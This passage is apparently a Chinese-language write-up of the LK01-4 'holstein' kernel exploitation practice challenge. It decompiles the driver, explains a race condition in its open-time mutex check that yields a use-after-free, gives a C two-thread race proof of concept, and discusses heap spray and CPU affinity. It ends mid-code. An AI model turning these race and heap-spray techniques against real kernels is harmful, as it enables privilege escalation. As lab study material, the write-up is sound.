title="module_initialize"></a>module_initialize</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token string">"holstein"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2F4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">4294967280LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>    qword_820 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>_this_module<span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dev_id<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>result <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_311<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dev_id<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">4294967280LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;dev&#x2F;holstein</p><h4 id="module-open"><a href="#module-open" class="headerlink" title="module_open"></a>module_open</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2B1<span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> mutex<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> mutex <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2C7<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    mutex <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    g_buf <span class="token operator">=</span> <span class="token function">kmem_cache_alloc</span><span class="token punctuation">(</span>kmalloc_caches<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">3520LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>g_buf <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2DA<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">12</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> v0<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>值得注意的是多了一个全局变量mutex，来保证同一时刻目标设备只能被打开一次</p><h4 id="module-read"><a href="#module-read" class="headerlink" title="module_read"></a>module_read</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">module_read</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 buf<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_23D<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> size <span class="token operator">&lt;=</span> <span class="token number">0x400</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v5 <span class="token operator">=</span> <span class="token function">copy_to_user</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> g_buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> size<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_26A<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_253<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="module-write"><a href="#module-write" class="headerlink" title="module_write"></a>module_write</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">module_write</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 buf<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_281<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> size <span class="token operator">&lt;=</span> <span class="token number">0x400</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v5 <span class="token operator">=</span> <span class="token function">copy_from_user</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> size<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_298<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_253<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="module-close"><a href="#module-close" class="headerlink" title="module_close"></a>module_close</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_226<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  mutex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>置空了mutex</p><h2 id="二-利用思路"><a href="#二-利用思路" class="headerlink" title="(二)利用思路"></a>(二)利用思路</h2><p>LK01-4试图通过引入一个新的mutex变量来保证同一时刻目标设备只能被打开一次。如果该措施有效，我们就不能通过open两次并close(fd1)来制造及触发UAF了。</p><p>但是，新引入的mutex变量作为保护措施，真的能够有效保证同一时刻目标设备只能被打开一次吗？一旦我们有某种方式能够绕过这层保护，同时打开多次该设备，那么该情景实际上就退化成了UAF的情景。</p><p>尽管这个驱动程序实现看起来很完美，但它仍然没有完全考虑<strong>访问多个进程或资源的情况。</strong></p><p>操作系统实现上下文切换，以便多个进程（线程）可以同时运行，并管理进程，实现多个线程运行多个程序。上下文切换并不是像函数那样的大粒度，而是以汇编指令为单位。因此，module_open函数在执行期间上下文可能会发生切换。</p><h3 id="竞态条件漏洞"><a href="#竞态条件漏洞" class="headerlink" title="竞态条件漏洞"></a>竞态条件漏洞</h3><p>我们接下来看两种情况，方便理解：</p><ol><li>理想状态下，线程A首先打开目标设备，<code>module_open</code>函数执行，mutex全局变量被设置1；此时线程B再尝试打开，<code>module_open</code>将返回EBUSY错误信息，打开失败。</li></ol><p><img src="/EXP_FILE/15d087d4882c2f3756eb151f76204d97_MD5.jpeg"></p><ol start="2"><li>然而，还有一种情况是，线程A首先打开目标设备，执行<code>module_open</code>函数到<code>if (mutex)</code>判断语句后、<code>mutex=1</code>操作之前时，线程B同样也执行到了<code>if (mutex)</code>判断语句后、<code>mutex=1</code>操作之前。这样一来，线程A和线程B都能顺利打开该设备，<code>mutex=1</code>将被执行两次。<br><img src="/EXP_FILE/36107d8d89958b1d3f62dc5d7a428f8d_MD5.jpeg"></li></ol><blockquote><p>这是由于没有使用原子操作来读写变量<code>互斥体</code>而导致的冲突。<br><code>互斥体</code>是一种同步对象，用于保护多个线程或进程之间共享的资源。互斥体的含义是“互相排斥”，也就是说，同一时间只能有一个线程或进程拥有互斥体的所有权，从而独占访问共享资源。其他线程或进程必须等待互斥体被释放后才能尝试获取互斥体的所有权。</p></blockquote><p>我们来编写代码验证可行性，poc如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">int</span> win <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">race</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>win<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span>                win <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>win <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> fd <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">close</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">close</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            win <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">pthread_t</span> th1<span class="token punctuation">,</span> th2<span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] running thread 1 and thread 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th1<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> race<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>th2<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> race<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">pthread_join</span><span class="token punctuation">(</span>th1<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">pthread_join</span><span class="token punctuation">(</span>th2<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] reached race condition"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x400</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> fd1 <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> fd2 <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] writing \'aptx4869\' into fd 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span>fd1<span class="token punctuation">,</span> <span class="token string">"aptx4869"</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] reading from fd 4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] content: %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建了两个竞争线程，不断进行module_open直到两者能够同时打开设备</p><h3 id="CPU与堆喷射"><a href="#CPU与堆喷射" class="headerlink" title="CPU与堆喷射"></a>CPU与堆喷射</h3><p>我们知道，多线程中的竞争条件意味着攻击期间使用了多个 CPU 核心，而SLUB分配器管理用于在每个CPU的内存区域中分配对象的slab。</p><p>换句话说，如果一个函数是从与当前运行该函数的线程不同的CPU核分配的，那么它自然会链接到分配时的CPU核对应的slab。那么，即使之后你在线程中使用Heap Spray ，其也不会受到Heap Spray的影响。 因此，在这种情况下，请小心多线程的Heap Spray 。</p><p>另外，&#x2F;dev&#x2F;ptmx通过打开文件来创建一个新的文件描述符，但是一个进程可以创建的文件描述符的数量是有限制的，所以如果需要大量的喷射，还需要关闭文件描述符。</p><h3 id="CPU-Affinity-CPU亲和性"><a href="#CPU-Affinity-CPU亲和性" class="headerlink" title="CPU Affinity(CPU亲和性)"></a>CPU Affinity(CPU亲和性)</h3><ul><li>一些基础知识<br>**超线程技术(Hyper-Threading)**：就是利用特殊的硬件指令，把两个逻辑内核(CPU core)模拟成两个物理芯片，让单个处理器都能使用线程级并行计算，进而兼容多线程操作系统和软件，减少了CPU的闲置时间，提高的CPU的运行效率。CPU的一个核心最少对应一个线程，但通过超线程（HT, Hyper-Threading）技术，一个核心可以有两个线程或多个线程，也就是说它可以同时运行两个或多个线程。比如说我们常听到的双核四线程&#x2F;四核八线程指的就是支持超线程技术的CPU。</li></ul><p><strong>物理CPU</strong>：机器上安装的实际CPU。比如说你的主板上安装了一个8核CPU,那么物理CPU个数就是1个,所以物理CPU个数就是主板上安装的CPU个数。</p><p><strong>逻辑CPU</strong>：一般情况，我们认为一颗CPU可以有多核，加上intel的超线程技术(HT), 可以在逻辑上再分一倍数量的CPU core出来。<code>逻辑CPU数量 = 物理CPU数量 x CPU cores x 2(如果支持并开启HT)</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看物理CPU个数</span><span class="token function">cat</span> /proc/cpuinfo<span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"physical id"</span><span class="token operator">|</span><span class="token function">sort</span> -u<span class="token operator">|</span><span class="token function">wc</span> <span class="token parameter variable">-l</span><span class="token comment"># 查看每个物理CPU中core的个数(即核数)</span><span class="token function">cat</span> /proc/cpuinfo<span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"cpu cores"</span><span class="token operator">|</span><span class="token function">uniq</span><span class="token comment"># 查看逻辑CPU的个数</span><span class="token function">cat</span> /proc/cpuinfo<span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"processor"</span><span class="token operator">|</span><span class="token function">wc</span> <span class="token parameter variable">-l</span><span class="token comment"># 查看CPU的名称型号</span><span class="token function">cat</span> /proc/cpuinfo<span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"name"</span><span class="token operator">|</span><span class="token function">cut</span> <span class="token parameter variable">-f2</span> -d:<span class="token operator">|</span><span class="token function">uniq</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>何为CPU亲和性<br>CPU绑定指的是在多核CPU的系统中将进程或线程绑定到指定的CPU核上去执行。在Linux中，我们可以利用<code>CPU affinity</code>属性把进程绑定到一个或多个CPU核上。</li></ul><p><code>CPU Affinity</code>是进程的一个属性，这个属性指明了进程调度器能够把这个进程调度到哪些CPU上。该属性要求进程在某个指定的CPU上尽量长时间地运行而不被迁移到其他处理器。</p><p>Linux提供了软CPU亲和性和硬CPU亲和性：<br>    <code>soft affinity</code>，进程尽量在指定的CPU上长时间运行，不被迁移到其他CPU。但是如果特殊情况，调度器还是会把进程调度到其它的CPU上去执行<br>    <code>hard affinity</code>，将进程或线程绑定到特定的CPU核心上运行。调度器必须严格遵守规则。</p><h3 id="设置CPU-Affinity"><a href="#设置CPU-Affinity" class="headerlink" title="设置CPU Affinity"></a>设置CPU Affinity</h3><blockquote><p>参考文章：<a href="https://zhuanlan.zhihu.com/p/432940336">如何将进程、线程与CPU核进行绑定 - 知乎 (zhihu.com)</a></p></blockquote><ul><li>在Linux中，用结构体<code>cpu_set_t</code>来表示CPU Affinity掩码，它是一个位图，每一位都代表一个CPU核心。通过设置和操作这个位图，可以控制进程或线程的 CPU 亲和性，即将其绑定到特定的 CPU 核心上。有如下一系列的宏来用于操作进程的可调度CPU集合：</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token keyword">void</span> <span class="token function">CPU_ZERO</span><span class="token punctuation">(</span><span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将set中的所有位清零，表示没有任何CPU核心被设置。</span><span class="token keyword">void</span> <span class="token function">CPU_SET</span><span class="token punctuation">(</span><span class="token keyword">int</span> cpu<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将set中的第cpu位设置为1，表示将对应的CPU核心添加到集合中。</span><span class="token keyword">void</span> <span class="token function">CPU_CLR</span><span class="token punctuation">(</span><span class="token keyword">int</span> cpu<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将set中的第cpu位清零，表示将对应的CPU核心从集合中移除。</span><span class="token keyword">int</span>  <span class="token function">CPU_ISSET</span><span class="token punctuation">(</span><span class="token keyword">int</span> cpu<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//检查set中的第cpu位是否被设置为1，返回一个非零值表示已设置，否则返回0。</span><span class="token keyword">int</span>  <span class="token function">CPU_COUNT</span><span class="token punctuation">(</span><span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">CPU_AND</span><span class="token punctuation">(</span><span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>destset<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>srcset1<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>srcset2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">CPU_OR</span><span class="token punctuation">(</span><span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>destset<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>srcset1<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>srcset2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">CPU_XOR</span><span class="token punctuation">(</span><span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>destset<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>srcset1<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>srcset2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span>  <span class="token function">CPU_EQUAL</span><span class="token punctuation">(</span><span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>set1<span class="token punctuation">,</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>set2<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>若要将进程和CPU核绑定，有<code>sched_setaffinity</code>可供使用：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sched.h></span></span><span class="token keyword">int</span> <span class="token function">sched_setaffinity</span><span class="token punctuation">(</span><span class="token class-name">pid_t</span> pid<span class="token punctuation">,</span> <span class="token class-name">size_t</span> cpusetsize<span class="token punctuation">,</span><span class="token keyword">const</span> <span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>mask<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置进程号为pid的进程运行在mask所设定的CPU上</span><span class="token keyword">int</span> <span class="token function">sched_getaffinity</span><span class="token punctuation">(</span><span class="token class-name">pid_t</span> pid<span class="token punctuation">,</span> <span class="token class-name">size_t</span> cpusetsize<span class="token punctuation">,</span><span class="token class-name">cpu_set_t</span> <span class="token operator">*</span>mask<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获得pid所指示的进程的CPU位掩码,并将该掩码返回到mask所指向的结构中</span><span class="token keyword">int</span> <span class="token function">sched_getcpu</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//当前进程运行在哪个CPU上</span><span class="token comment">/*pid: 进程号，若为0则表明是当前进程cpusetsize: 是mask所指的数的长度，通常设为sizeof(cpu_set_t)mask: CPU位图*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>若要将线程和CPU核绑定，有<code>pthread_setaffinity_np</code>可供使用</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span> </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span><span class="token keyword">int</span> <span class="token function">pthread_setaffinity_np</span><span class="token punctuation">(</span><span class="token class-name">pthread_t</span> thread<span class="token punctuation">,</span> <span class="token class-name">size_t</span> cpusetsize<span class="token 